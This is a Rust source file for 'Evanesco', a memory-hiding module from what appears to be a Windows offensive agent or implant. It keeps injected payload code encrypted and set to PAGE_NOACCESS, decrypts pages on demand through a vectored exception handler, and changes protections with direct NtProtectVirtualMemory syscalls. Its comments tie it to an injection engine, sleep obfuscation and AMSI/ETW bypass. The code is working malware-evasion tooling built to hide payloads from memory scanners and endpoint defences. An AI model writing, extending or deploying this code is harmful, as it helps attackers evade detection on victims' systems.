//! Continuous Memory Hiding — "Evanesco"
//!
//! Keeps all enrolled pages in an encrypted / `PAGE_NOACCESS` state at ALL
//! times, not just during sleep.  When code needs to access a page it
//! acquires a [`PageGuard`] (RAII) which decrypts the page temporarily;
//! the guard re-encrypts it on drop.  A VEH handler auto-decrypts pages on
//! `STATUS_ACCESS_VIOLATION` when execution hits a tracked `PAGE_NOACCESS`
//! region, and a background re-encryption thread periodically re-encrypts
//! pages that have been idle longer than a configurable threshold.
//!
//! # Encryption
//!
//! Per-page **XChaCha20-Poly1305** (32-byte key, 24-byte nonce, 16-byte tag)
//! with a fresh random nonce per encrypt cycle.  The nonce and tag are stored
//! in a sidecar map keyed by page address, keeping the page-sized regions
//! intact.  Key generation uses `OsRng` for cryptographic randomness.
//!
//! # Integration
//!
//! - **`memory_guard.rs`**: Evanesco is an additional layer; the existing
//!   XChaCha20-Poly1305 key protection continues unchanged.
//! - **`sleep_obfuscation.rs`**: On sleep, Evanesco encrypts all tracked
//!   pages immediately.  On wake, only the minimum required pages are
//!   decrypted.
//! - **`injection_engine.rs`**: Payload code sections are enrolled for
//!   tracking after injection.
//!
//! # Feature gate
//!
//! The entire module is compiled only when both `cfg(windows)` and the
//! `evanesco` feature are active.

#![cfg(all(windows, feature = "evanesco"))]

use anyhow::{anyhow, Result};
use chacha20poly1305::{
    aead::{Aead, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;
use std::collections::HashMap;
use std::ptr;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex, OnceLock, RwLock};
use std::time::Instant;

// ── Windows constants ────────────────────────────────────────────────────────

/// PAGE_NOACCESS protection constant.
const PAGE_NOACCESS: u32 = 0x01;
/// PAGE_READONLY protection constant.
const PAGE_READONLY: u32 = 0x02;
/// PAGE_READWRITE protection constant.
const PAGE_READWRITE: u32 = 0x04;
/// PAGE_EXECUTE_READ protection constant.
const PAGE_EXECUTE_READ: u32 = 0x20;
/// PAGE_EXECUTE_READWRITE protection constant.
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// STATUS_ACCESS_VIOLATION exception code (0xC0000005).
const STATUS_ACCESS_VIOLATION: u32 = 0xC0000005;

/// VEH return: continue execution (exception handled).
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
/// VEH return: continue searching (exception not handled).
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Current process pseudo-handle (-1).
const CURRENT_PROCESS: u64 = std::u64::MAX;

// ── XChaCha20-Poly1305 constants ─────────────────────────────────────────────

/// XChaCha20-Poly1305 key length in bytes.
const AEAD_KEY_LEN: usize = 32;
/// XChaCha20-Poly1305 nonce length in bytes.
const AEAD_NONCE_LEN: usize = 24;
/// Poly1305 tag length in bytes.
const AEAD_TAG_LEN: usize = 16;

/// Sidecar entry: stores the nonce and authentication tag for a single
/// encrypted page.
#[derive(Clone)]
struct PageCrypto {
    /// The 24-byte nonce used for the last encryption.
    nonce: [u8; AEAD_NONCE_LEN],
    /// The 16-byte Poly1305 authentication tag.
    tag: [u8; AEAD_TAG_LEN],
}

/// Generate a random 32-byte AEAD key using `OsRng`.
fn random_aead_key() -> [u8; AEAD_KEY_LEN] {
    let mut key = [0u8; AEAD_KEY_LEN];
    OsRng.fill_bytes(&mut key);
    key
}

// ── Page state machine ───────────────────────────────────────────────────────

/// Tracked page state.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PageState {
    /// Page is encrypted and set to PAGE_NOACCESS.
    Encrypted,
    /// Page is decrypted for read/write access (PAGE_READWRITE).
    DecryptedRW,
    /// Page is decoded for execution (PAGE_EXECUTE_READ).
    DecodedRX,
}

/// Access type requested when acquiring a page.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AccessType {
    /// Read/write access → PAGE_READWRITE.
    ReadWrite,
    /// Execute access → PAGE_EXECUTE_READ.
    Execute,
}

impl AccessType {
    /// Convert to a Windows PAGE_* protection constant.
    fn to_protect(self) -> u32 {
        match self {
            AccessType::ReadWrite => PAGE_READWRITE,
            AccessType::Execute => PAGE_EXECUTE_READ,
        }
    }

    /// Convert to the corresponding [`PageState`].
    fn to_state(self) -> PageState {
        match self {
            AccessType::ReadWrite => PageState::DecryptedRW,
            AccessType::Execute => PageState::DecodedRX,
        }
    }
}

/// Per-page metadata stored inside the tracker.
#[derive(Debug)]
pub struct PageInfo {
    /// Base address of the page (page-aligned).
    pub base: usize,
    /// Size of the tracked region in bytes.
    pub size: usize,
    /// Current state of the page.
    pub state: PageState,
    /// Per-page XChaCha20-Poly1305 key (32 bytes).
    pub aead_key: [u8; AEAD_KEY_LEN],
    /// Instant of the last decrypt (transition away from Encrypted).
    pub last_access: Instant,
    /// Original protection when the page was enrolled.
    pub orig_protect: u32,
    /// Label for debugging / telemetry (e.g. "payload.text").
    pub label: String,
}

// ── PageGuard (RAII) ────────────────────────────────────────────────────────

/// RAII guard that decrypts pages on creation and re-encrypts them on drop.
///
/// Obtain via [`PageTracker::acquire_pages`].  While the guard exists the
/// covered pages are in a decrypted state with the requested access
/// protection.  When the guard is dropped the pages are immediately
/// re-encrypted and set back to `PAGE_NOACCESS`.
pub struct PageGuard {
    /// Ranges covered by this guard: (base, size).
    ranges: Vec<(usize, usize)>,
    /// The access type that was applied.
    access: AccessType,
    /// Dropped flag to prevent double-drop on panic paths.
    dropped: bool,
}

impl PageGuard {
    fn new(ranges: Vec<(usize, usize)>, access: AccessType) -> Self {
        Self {
            ranges,
            access,
            dropped: false,
        }
    }

    /// Access type of this guard.
    pub fn access_type(&self) -> AccessType {
        self.access
    }

    /// Manually release the guard early (re-encrypts now instead of on drop).
    pub fn release(mut self) {
        self.re_encrypt();
        self.dropped = true;
    }

    /// Internal re-encryption logic called from Drop or release().
    fn re_encrypt(&self) {
        let tracker = match GLOBAL_TRACKER.get() {
            Some(t) => t,
            None => return,
        };
        let mut pages = match tracker.pages.write() {
            Ok(g) => g,
            Err(_) => return,
        };
        let mut crypto_sidecar = match tracker.crypto_sidecar.write() {
            Ok(g) => g,
            Err(_) => return,
        };
        for &(base, size) in &self.ranges {
            encrypt_page_unlocked(&mut pages, &mut crypto_sidecar, base, size);
        }
    }
}

impl Drop for PageGuard {
    fn drop(&mut self) {
        if !self.dropped {
            self.re_encrypt();
        }
    }
}

// ── Internal helpers ─────────────────────────────────────────────────────────

/// Encrypt a single page region and set PAGE_NOACCESS.
///
/// Caller must hold the `pages` write lock.
/// `crypto_sidecar` stores the nonce and tag (not written into the page).
fn encrypt_page_unlocked(
    pages: &mut HashMap<usize, PageInfo>,
    crypto_sidecar: &mut HashMap<usize, PageCrypto>,
    base: usize,
    size: usize,
) {
    if let Some(info) = pages.get_mut(&base) {
        if info.state == PageState::Encrypted {
            return; // already encrypted
        }

        // Generate a fresh random nonce for this encryption cycle.
        let mut nonce_bytes = [0u8; AEAD_NONCE_LEN];
        OsRng.fill_bytes(&mut nonce_bytes);
        let xnonce = XNonce::from_slice(&nonce_bytes);

        let cipher = match XChaCha20Poly1305::new_from_slice(&info.aead_key) {
            Ok(c) => c,
            Err(_) => {
                log::error!("evanesco: XChaCha20-Poly1305 key init failed for {:?}", info.label);
                return;
            }
        };

        // Safety: the page is currently decrypted (RW or RX) so it is safe
        // to read/write.
        let ct_tag = unsafe {
            let ptr = base as *mut u8;
            let plaintext = std::slice::from_raw_parts(ptr, size);
            match cipher.encrypt(xnonce, plaintext as &[u8]) {
                Ok(ct) => ct,
                Err(_) => {
                    log::error!("evanesco: XChaCha20-Poly1305 encryption failed for {:?}", info.label);
                    return;
                }
            }
        };

        // ct_tag = [ciphertext || tag(16 bytes)]
        let ct_len = ct_tag.len() - AEAD_TAG_LEN;
        let mut tag = [0u8; AEAD_TAG_LEN];
        tag.copy_from_slice(&ct_tag[ct_len..]);

        // Write ciphertext back to the page (same size as plaintext).
        unsafe {
            let ptr = base as *mut u8;
            std::ptr::copy_nonoverlapping(ct_tag.as_ptr(), ptr, ct_len);
        }

        // Store nonce + tag in the sidecar (not in the page itself).
        crypto_sidecar.insert(base, PageCrypto {
            nonce: nonce_bytes,
            tag,
        });

        // Set PAGE_NOACCESS via direct syscall.
        // FIX: BaseAddress and RegionSize are IN/OUT parameters — must use
        // mutable pointers so the kernel can write back the rounded values.
        let mut kernel_base = base;
        let mut kernel_size = size;
        let mut old_prot: u32 = 0;
        let status = unsafe {
            crate::syscalls::syscall_NtProtectVirtualMemory(
                CURRENT_PROCESS,
                &mut kernel_base as *mut usize as u64,
                &mut kernel_size as *mut usize as u64,
                PAGE_NOACCESS as u64,
                &mut old_prot as *mut u32 as u64,
            )
        };
        if status < 0 {
            log::error!(
                "evanesco: NtProtectVirtualMemory(PAGE_NOACCESS) failed for {:?} status={:#x}",
                info.label,
                status as u32
            );
        }
        // Update page info with kernel-returned values.
        info.base = kernel_base;
        info.size = kernel_size;
        info.state = PageState::Encrypted;
    }
}

/// Decrypt a single page region and set the requested protection.
///
/// Caller must hold the `pages` write lock.
/// `crypto_sidecar` provides the nonce and tag for AEAD decryption.
/// If tag verification fails, the page is zeroed (fail-closed).
fn decrypt_page_unlocked(
    pages: &mut HashMap<usize, PageInfo>,
    crypto_sidecar: &mut HashMap<usize, PageCrypto>,
    base: usize,
    size: usize,
    access: AccessType,
) -> bool {
    if let Some(info) = pages.get_mut(&base) {
        if info.state != PageState::Encrypted {
            // Already decrypted — just update access time.
            info.last_access = Instant::now();
            return true;
        }

        // Retrieve the sidecar nonce + tag.
        let crypto = match crypto_sidecar.get(&base) {
            Some(c) => c.clone(),
            None => {
                log::error!(
                    "evanesco: no sidecar crypto for {:?} at {:#x} — zeroing page",
                    info.label, base
                );
                // No crypto metadata — page is unrecoverable.  Zero it.
                // First change protection so we can write.
                let mut kernel_base = base;
                let mut kernel_size = size;
                let mut old_prot: u32 = 0;
                unsafe {
                    crate::syscalls::syscall_NtProtectVirtualMemory(
                        CURRENT_PROCESS,
                        &mut kernel_base as *mut usize as u64,
                        &mut kernel_size as *mut usize as u64,
                        PAGE_READWRITE as u64,
                        &mut old_prot as *mut u32 as u64,
                    )
                };
                unsafe {
                    std::ptr::write_bytes(base as *mut u8, 0, size);
                }
                return false;
            }
        };

        // First change protection so we can write to the page.
        let new_prot = access.to_protect();
        // FIX: BaseAddress and RegionSize are IN/OUT — mutable pointers.
        let mut kernel_base = base;
        let mut kernel_size = size;
        let mut old_prot: u32 = 0;
        let status = unsafe {
            crate::syscalls::syscall_NtProtectVirtualMemory(
                CURRENT_PROCESS,
                &mut kernel_base as *mut usize as u64,
                &mut kernel_size as *mut usize as u64,
                new_prot as u64,
                &mut old_prot as *mut u32 as u64,
            )
        };
        if status < 0 {
            log::error!(
                "evanesco: NtProtectVirtualMemory({:?}) failed for {:?} status={:#x}",
                access,
                info.label,
                status as u32
            );
            return false;
        }
        info.base = kernel_base;
        info.size = kernel_size;

        // XChaCha20-Poly1305 decrypt + tag verify.
        let cipher = match XChaCha20Poly1305::new_from_slice(&info.aead_key) {
            Ok(c) => c,
            Err(_) => {
                log::error!("evanesco: XChaCha20-Poly1305 key init failed for {:?}", info.label);
                return false;
            }
        };
        let xnonce = XNonce::from_slice(&crypto.nonce);

        // Build ct || tag for decryption.
        let mut combined = Vec::with_capacity(size + AEAD_TAG_LEN);
        unsafe {
            let ptr = base as *mut u8;
            combined.extend_from_slice(std::slice::from_raw_parts(ptr, size));
        }
        combined.extend_from_slice(&crypto.tag);

        match cipher.decrypt(xnonce, combined.as_slice()) {
            Ok(pt) => {
                unsafe {
                    std::ptr::copy_nonoverlapping(pt.as_ptr(), base as *mut u8, pt.len());
                }
            }
            Err(_) => {
                log::error!(
                    "evanesco: AEAD tag mismatch for {:?} at {:#x} — page may have been tampered with, zeroing",
                    info.label, base
                );
                // Fail-closed: zero the page.
                unsafe {
                    std::ptr::write_bytes(base as *mut u8, 0, size);
                }
                return false;
            }
        }

        info.state = access.to_state();
        info.last_access = Instant::now();
        return true;
    }
    false
}

// ── PageTracker ──────────────────────────────────────────────────────────────

/// Core page-tracking state shared between the VEH handler, background
/// thread, and public API.
struct PageTrackerInner {
    /// Map from page-aligned base address to per-page metadata.
    pages: RwLock<HashMap<usize, PageInfo>>,
    /// Sidecar map: per-page nonce + tag (NOT stored in the page itself,
    /// since the encrypted data is the same size as the plaintext).
    crypto_sidecar: RwLock<HashMap<usize, PageCrypto>>,
    /// Idle threshold in milliseconds. Pages idle longer than this are
    /// re-encrypted by the background thread.
    idle_threshold_ms: AtomicU64,
    /// Scan interval in milliseconds for the background thread.
    scan_interval_ms: AtomicU64,
    /// Statistics: total encrypt calls.
    encrypt_count: AtomicUsize,
    /// Statistics: total decrypt calls.
    decrypt_count: AtomicUsize,
    /// Shutdown flag for the background thread.
    shutdown: AtomicBool,
    /// Handle to the background thread (joined on drop).
    thread_handle: Mutex<Option<std::thread::JoinHandle<()>>>,
    /// VEH registration handle (for removal on shutdown).
    veh_handle: Mutex<Option<usize>>,
}

/// Global singleton tracker.
static GLOBAL_TRACKER: OnceLock<Arc<PageTrackerInner>> = OnceLock::new();

/// Initialise the global page tracker.  Must be called once during agent
/// startup, **before** any AMSI/ETW bypass activation.
///
/// - `idle_threshold_ms`: Pages idle longer than this are re-encrypted.
/// - `scan_interval_ms`: Background thread scan interval.
pub fn init(idle_threshold_ms: u64, scan_interval_ms: u64) -> Result<()> {
    let inner = Arc::new(PageTrackerInner {
        pages: RwLock::new(HashMap::new()),
        crypto_sidecar: RwLock::new(HashMap::new()),
        idle_threshold_ms: AtomicU64::new(idle_threshold_ms),
        scan_interval_ms: AtomicU64::new(scan_interval_ms),
        encrypt_count: AtomicUsize::new(0),
        decrypt_count: AtomicUsize::new(0),
        shutdown: AtomicBool::new(false),
        thread_handle: Mutex::new(None),
        veh_handle: Mutex::new(None),
    });

    // Register VEH handler BEFORE anything else.
    register_veh(&inner)?;

    // Spawn background re-encryption thread.
    spawn_background_thread(&inner)?;

    GLOBAL_TRACKER
        .set(inner)
        .map_err(|_| anyhow!("evanesco: init called more than once"))?;

    log::info!(
        "evanesco: initialised (idle_threshold={}ms, scan_interval={}ms)",
        idle_threshold_ms,
        scan_interval_ms
    );
    Ok(())
}

/// Shut down the Evanesco subsystem.  Decrypts all tracked pages and
/// removes the VEH handler.  Called during agent shutdown.
pub fn shutdown() {
    let inner = match GLOBAL_TRACKER.get() {
        Some(t) => t,
        None => return,
    };

    // Signal the background thread to stop.
    inner.shutdown.store(true, Ordering::SeqCst);

    // Join the background thread.
    if let Ok(mut guard) = inner.thread_handle.lock() {
        if let Some(handle) = guard.take() {
            let _ = handle.join();
        }
    }

    // Decrypt all pages back to their original state.
    {
        let mut pages = match inner.pages.write() {
            Ok(g) => g,
            Err(_) => return,
        };
        let mut crypto_sidecar = match inner.crypto_sidecar.write() {
            Ok(g) => g,
            Err(_) => return,
        };
        for (&base, info) in pages.iter_mut() {
            if info.state == PageState::Encrypted {
                // Restore original protection first.
                let mut old_prot: u32 = 0;
                let mut kernel_base = base;
                let mut kernel_size = info.size;
                let status = unsafe {
                    crate::syscalls::syscall_NtProtectVirtualMemory(
                        CURRENT_PROCESS,
                        &mut kernel_base as *mut usize as u64,
                        &mut kernel_size as *mut usize as u64,
                        info.orig_protect as u64,
                        &mut old_prot as *mut u32 as u64,
                    )
                };
                if status >= 0 {
                    info.base = kernel_base;
                    info.size = kernel_size;
                    // Decrypt using sidecar if available.
                    if let Some(crypto) = crypto_sidecar.get(&base) {
                        let cipher = match XChaCha20Poly1305::new_from_slice(&info.aead_key) {
                            Ok(c) => c,
                            Err(_) => continue,
                        };
                        let xnonce = XNonce::from_slice(&crypto.nonce);
                        let mut combined = Vec::with_capacity(info.size + AEAD_TAG_LEN);
                        unsafe {
                            let ptr = base as *mut u8;
                            combined.extend_from_slice(std::slice::from_raw_parts(ptr, info.size));
                        }
                        combined.extend_from_slice(&crypto.tag);
                        if let Ok(pt) = cipher.decrypt(xnonce, combined.as_slice()) {
                            unsafe {
                                std::ptr::copy_nonoverlapping(pt.as_ptr(), base as *mut u8, pt.len());
                            }
                        }
                    }
                    info.state = match info.orig_protect {
                        p if p == PAGE_EXECUTE_READ => PageState::DecodedRX,
                        _ => PageState::DecryptedRW,
                    };
                }
            }
        }
        pages.clear();
        crypto_sidecar.clear();
    }

    // Remove VEH handler.
    if let Ok(mut guard) = inner.veh_handle.lock() {
        if let Some(handle) = guard.take() {
            unsafe {
                remove_veh(handle);
            }
        }
    }

    log::info!("evanesco: shutdown complete");
}

// ── VEH handler ──────────────────────────────────────────────────────────────

/// Register the Vectored Exception Handler for auto-decryption.
fn register_veh(inner: &Arc<PageTrackerInner>) -> Result<()> {
    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;

    // Store a raw pointer to the inner tracker in a module-level static.
    // The Arc is never dropped while the VEH is registered (shutdown
    // removes the VEH before releasing the Arc).
    VEH_TRACKER_PTR
        .set(Arc::as_ptr(inner))
        .map_err(|_| anyhow!("evanesco: VEH tracker pointer already set"))?;

    let handle = unsafe {
        AddVectoredExceptionHandler(
            1, // first handler
            Some(veh_handler),
        )
    };
    if handle.is_null() {
        return Err(anyhow!("evanesco: AddVectoredExceptionHandler failed"));
    }
    if let Ok(mut guard) = inner.veh_handle.lock() {
        *guard = Some(handle as usize);
    }
    log::debug!("evanesco: VEH registered at {:?}", handle);
    Ok(())
}

/// Remove a previously registered VEH handler.
unsafe fn remove_veh(handle: usize) {
    use winapi::um::errhandlingapi::RemoveVectoredExceptionHandler;
    RemoveVectoredExceptionHandler(handle as *mut _);
}

/// Module-level static holding the raw pointer to the tracker inner,
/// accessible from the bare VEH function pointer.
static VEH_TRACKER_PTR: OnceLock<*const PageTrackerInner> = OnceLock::new();

/// VEH handler for STATUS_ACCESS_VIOLATION on tracked PAGE_NOACCESS pages.
///
/// When the exception address falls within a tracked page that is currently
/// `Encrypted` (PAGE_NOACCESS), this handler:
/// 1. Checks `ExceptionInformation[0]` to determine the fault type:
///    0 = read, 1 = write, 8 = DEP/execute.
/// 2. Decrypts the page with XChaCha20-Poly1305.
/// 3. Sets the protection appropriate to the fault type:
///    read → PAGE_READONLY, write → PAGE_READWRITE, execute → PAGE_EXECUTE_READ.
/// 4. Returns `EXCEPTION_CONTINUE_EXECUTION` to resume the faulting
///    instruction.
unsafe extern "system" fn veh_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let ei = match (exception_info).as_ref() {
        Some(ei) => ei,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    let record = match ei.ExceptionRecord.as_ref() {
        Some(r) => r,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    // Only handle STATUS_ACCESS_VIOLATION.
    if record.ExceptionCode != STATUS_ACCESS_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let fault_addr = record.ExceptionInformation[1] as usize;

    // Determine the fault type from ExceptionInformation[0]:
    //   0 = read access, 1 = write access, 8 = DEP (execute) violation.
    let access = match record.ExceptionInformation[0] {
        0 => AccessType::ReadWrite, // read fault → decrypt as RW
        1 => AccessType::ReadWrite, // write fault → decrypt as RW
        8 => AccessType::Execute,   // DEP/execute fault → decrypt as RX
        _ => return EXCEPTION_CONTINUE_SEARCH,
    };

    // Retrieve the tracker pointer from the module-level static.
    let inner_ptr = match VEH_TRACKER_PTR.get() {
        Some(&p) => p,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };
    let inner = &*inner_ptr;

    // Quick check: page-align the fault address and see if it's tracked.
    let page_base = fault_addr & !0xFFF;
    {
        let pages = match inner.pages.read() {
            Ok(g) => g,
            Err(_) => return EXCEPTION_CONTINUE_SEARCH,
        };
        if !pages.contains_key(&page_base) {
            return EXCEPTION_CONTINUE_SEARCH;
        }
    } // release read lock before write

    // Decrypt the page.
    let mut pages = match inner.pages.write() {
        Ok(g) => g,
        Err(_) => return EXCEPTION_CONTINUE_SEARCH,
    };
    let mut crypto_sidecar = match inner.crypto_sidecar.write() {
        Ok(g) => g,
        Err(_) => return EXCEPTION_CONTINUE_SEARCH,
    };

    let size = match pages.get(&page_base) {
        Some(i) => i.size,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    if decrypt_page_unlocked(&mut pages, &mut crypto_sidecar, page_base, size, access) {
        inner.decrypt_count.fetch_add(1, Ordering::Relaxed);
        EXCEPTION_CONTINUE_EXECUTION
    } else {
        EXCEPTION_CONTINUE_SEARCH
    }
}

// ── Background re-encryption thread ──────────────────────────────────────────

/// Spawn the background thread that periodically re-encrypts idle pages.
fn spawn_background_thread(inner: &Arc<PageTrackerInner>) -> Result<()> {
    let inner_clone = Arc::clone(inner);
    let handle = std::thread::Builder::new()
        .name(
            String::from_utf8_lossy(&string_crypt::enc_str!("evanesco-bg"))
                .trim_end_matches('\0')
                .to_string(),
        )
        .spawn(move || {
            background_loop(&inner_clone);
        })
        .map_err(|e| anyhow!("evanesco: failed to spawn background thread: {}", e))?;

    if let Ok(mut guard) = inner.thread_handle.lock() {
        *guard = Some(handle);
    }
    Ok(())
}

fn background_loop(inner: &Arc<PageTrackerInner>) {
    loop {
        if inner.shutdown.load(Ordering::SeqCst) {
            break;
        }

        let scan_ms = inner.scan_interval_ms.load(Ordering::Relaxed);
        std::thread::sleep(std::time::Duration::from_millis(scan_ms));

        if inner.shutdown.load(Ordering::SeqCst) {
            break;
        }

        let threshold_ms = inner.idle_threshold_ms.load(Ordering::Relaxed);
        let now = Instant::now();

        // Collect pages to re-encrypt under read lock.
        let to_encrypt: Vec<(usize, usize)> = {
            let pages = match inner.pages.read() {
                Ok(g) => g,
                Err(_) => continue,
            };
            pages
                .iter()
                .filter(|(_, info)| {
                    info.state != PageState::Encrypted
                        && now.duration_since(info.last_access).as_millis()
                            >= threshold_ms as u128
                })
                .map(|(&base, info)| (base, info.size))
                .collect()
        };

        // Re-encrypt each page under write lock.
        if !to_encrypt.is_empty() {
            let mut pages = match inner.pages.write() {
                Ok(g) => g,
                Err(_) => continue,
            };
            let mut crypto_sidecar = match inner.crypto_sidecar.write() {
                Ok(g) => g,
                Err(_) => continue,
            };
            for (base, size) in to_encrypt {
                encrypt_page_unlocked(&mut pages, &mut crypto_sidecar, base, size);
                inner.encrypt_count.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Enrol a memory region for continuous tracking.
///
/// The region is immediately encrypted and set to `PAGE_NOACCESS`.
/// The `label` is used for logging/telemetry.
pub fn enroll(base: *mut u8, size: usize, orig_protect: u32, label: &str) -> Result<()> {
    let inner = GLOBAL_TRACKER
        .get()
        .ok_or_else(|| anyhow!("evanesco: not initialised"))?;

    // Page-align base.
    let aligned_base = (base as usize) & !0xFFF;
    let end = ((base as usize + size + 0xFFF) & !0xFFF);
    let aligned_size = end - aligned_base;

    let info = PageInfo {
        base: aligned_base,
        size: aligned_size,
        state: PageState::Encrypted, // will be encrypted below
        aead_key: random_aead_key(),
        last_access: Instant::now(),
        orig_protect,
        label: label.to_string(),
    };

    {
        let mut pages = inner.pages.write().map_err(|e| {
            anyhow!("evanesco: failed to acquire pages lock: {}", e)
        })?;
        pages.insert(aligned_base, info);
    }

    // Now encrypt the page.
    {
        let mut pages = inner.pages.write().map_err(|e| {
            anyhow!("evanesco: failed to acquire pages lock: {}", e)
        })?;
        let mut crypto_sidecar = inner.crypto_sidecar.write().map_err(|e| {
            anyhow!("evanesco: failed to acquire crypto_sidecar lock: {}", e)
        })?;
        // The page starts decrypted (caller just gave us the memory), so we
        // need to set up the initial state properly.  First, set it to
        // DecryptedRW so encrypt_page_unlocked will actually encrypt it.
        if let Some(info) = pages.get_mut(&aligned_base) {
            info.state = PageState::DecryptedRW;
        }
        encrypt_page_unlocked(&mut pages, &mut crypto_sidecar, aligned_base, aligned_size);
        inner.encrypt_count.fetch_add(1, Ordering::Relaxed);
    }

    log::debug!(
        "evanesco: enrolled region base={:#x} size={} label={:?}",
        aligned_base,
        aligned_size,
        label
    );
    Ok(())
}

/// Acquire temporary access to a set of tracked pages.  Returns a [`PageGuard`]
/// that decrypts the pages on creation and re-encrypts them on drop.
///
/// # Safety
///
/// The caller must ensure that the ranges correspond to enrolled pages and
/// that no other thread is accessing those pages concurrently in a way that
/// would be invalidated by the protection change.
pub fn acquire_pages(
    ranges: &[(usize, usize)],
    access: AccessType,
) -> Result<PageGuard> {
    let inner = GLOBAL_TRACKER
        .get()
        .ok_or_else(|| anyhow!("evanesco: not initialised"))?;

    let mut pages = inner.pages.write().map_err(|e| {
        anyhow!("evanesco: failed to acquire pages lock: {}", e)
    })?;
    let mut crypto_sidecar = inner.crypto_sidecar.write().map_err(|e| {
        anyhow!("evanesco: failed to acquire crypto_sidecar lock: {}", e)
    })?;

    for &(base, size) in ranges {
        decrypt_page_unlocked(&mut pages, &mut crypto_sidecar, base, size, access);
        inner.decrypt_count.fetch_add(1, Ordering::Relaxed);
    }

    Ok(PageGuard::new(ranges.to_vec(), access))
}

/// Encrypt ALL tracked pages immediately.  Used by sleep_obfuscation before
/// the full memory sweep.
pub fn encrypt_all() {
    let inner = match GLOBAL_TRACKER.get() {
        Some(t) => t,
        None => return,
    };

    let mut pages = match inner.pages.write() {
        Ok(g) => g,
        Err(_) => return,
    };
    let mut crypto_sidecar = match inner.crypto_sidecar.write() {
        Ok(g) => g,
        Err(_) => return,
    };

    for (&base, info) in pages.iter_mut() {
        if info.state != PageState::Encrypted {
            encrypt_page_unlocked(&mut pages, &mut crypto_sidecar, base, info.size);
            inner.encrypt_count.fetch_add(1, Ordering::Relaxed);
        }
    }
}

/// Decrypt a minimum set of pages needed for the agent to function after
/// wake-up.  Currently decrypts nothing by default — callers should use
/// `acquire_pages` for specific regions they need.
pub fn decrypt_minimum() {
    // After wake-up the agent relies on acquire_pages / VEH for on-demand
    // decryption.  This function is a no-op but exists as an explicit
    // integration point for sleep_obfuscation.
}

/// Update the idle threshold at runtime.
pub fn set_idle_threshold(ms: u64) {
    if let Some(inner) = GLOBAL_TRACKER.get() {
        inner.idle_threshold_ms.store(ms, Ordering::Relaxed);
        log::info!("evanesco: idle threshold updated to {}ms", ms);
    }
}

/// Get the current idle threshold.
pub fn idle_threshold() -> u64 {
    GLOBAL_TRACKER
        .get()
        .map(|i| i.idle_threshold_ms.load(Ordering::Relaxed))
        .unwrap_or(0)
}

/// Return a JSON status snapshot of the Evanesco subsystem.
pub fn status_json() -> String {
    let inner = match GLOBAL_TRACKER.get() {
        Some(t) => t,
        None => return r#"{"error":"not initialised"}"#.to_string(),
    };

    let pages = match inner.pages.read() {
        Ok(g) => g,
        Err(_) => return r#"{"error":"lock poisoned"}"#.to_string(),
    };

    let total = pages.len();
    let mut encrypted = 0usize;
    let mut decrypted_rw = 0usize;
    let mut decoded_rx = 0usize;
    for info in pages.values() {
        match info.state {
            PageState::Encrypted => encrypted += 1,
            PageState::DecryptedRW => decrypted_rw += 1,
            PageState::DecodedRX => decoded_rx += 1,
        }
    }

    format!(
        r#"{{"total_pages":{},"encrypted":{},"decrypted_rw":{},"decoded_rx":{},"idle_threshold_ms":{},"scan_interval_ms":{},"encrypt_count":{},"decrypt_count":{}}}"#,
        total,
        encrypted,
        decrypted_rw,
        decoded_rx,
        inner.idle_threshold_ms.load(Ordering::Relaxed),
        inner.scan_interval_ms.load(Ordering::Relaxed),
        inner.encrypt_count.load(Ordering::Relaxed),
        inner.decrypt_count.load(Ordering::Relaxed),
    )
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_aead_roundtrip() {
        use chacha20poly1305::{aead::Aead, KeyInit, XChaCha20Poly1305};
        let key = [0x42u8; AEAD_KEY_LEN];
        let nonce_bytes = [0xAAu8; AEAD_NONCE_LEN];
        let original = b"Hello, Evanesco! This is a test of XChaCha20-Poly1305.";
        let cipher = XChaCha20Poly1305::new_from_slice(&key).unwrap();
        let nonce = chacha20poly1305::XNonce::from_slice(&nonce_bytes);
        let ciphertext = cipher.encrypt(nonce, original.as_ref()).unwrap();
        assert_ne!(&ciphertext[..original.len()], &original[..]);
        let plaintext = cipher.decrypt(nonce, ciphertext.as_slice()).unwrap();
        assert_eq!(&plaintext[..], &original[..]);
    }

    #[test]
    fn test_aead_empty() {
        use chacha20poly1305::{aead::Aead, KeyInit, XChaCha20Poly1305};
        let key = [0xABu8; AEAD_KEY_LEN];
        let nonce_bytes = [0xBBu8; AEAD_NONCE_LEN];
        let cipher = XChaCha20Poly1305::new_from_slice(&key).unwrap();
        let nonce = chacha20poly1305::XNonce::from_slice(&nonce_bytes);
        let ciphertext = cipher.encrypt(nonce, b"").unwrap();
        // Ciphertext is just the 16-byte tag for empty plaintext.
        assert_eq!(ciphertext.len(), AEAD_TAG_LEN);
        let plaintext = cipher.decrypt(nonce, ciphertext.as_slice()).unwrap();
        assert!(plaintext.is_empty());
    }

    #[test]
    fn test_aead_different_keys_produce_different_ciphertext() {
        use chacha20poly1305::{aead::Aead, KeyInit, XChaCha20Poly1305};
        let key_a = [0x01u8; AEAD_KEY_LEN];
        let key_b = [0x02u8; AEAD_KEY_LEN];
        let nonce_bytes = [0xCCu8; AEAD_NONCE_LEN];
        let plaintext = b"Same plaintext different keys";
        let nonce = chacha20poly1305::XNonce::from_slice(&nonce_bytes);
        let cipher_a = XChaCha20Poly1305::new_from_slice(&key_a).unwrap();
        let cipher_b = XChaCha20Poly1305::new_from_slice(&key_b).unwrap();
        let ct_a = cipher_a.encrypt(nonce, plaintext.as_ref()).unwrap();
        let ct_b = cipher_b.encrypt(nonce, plaintext.as_ref()).unwrap();
        assert_ne!(ct_a, ct_b);
    }

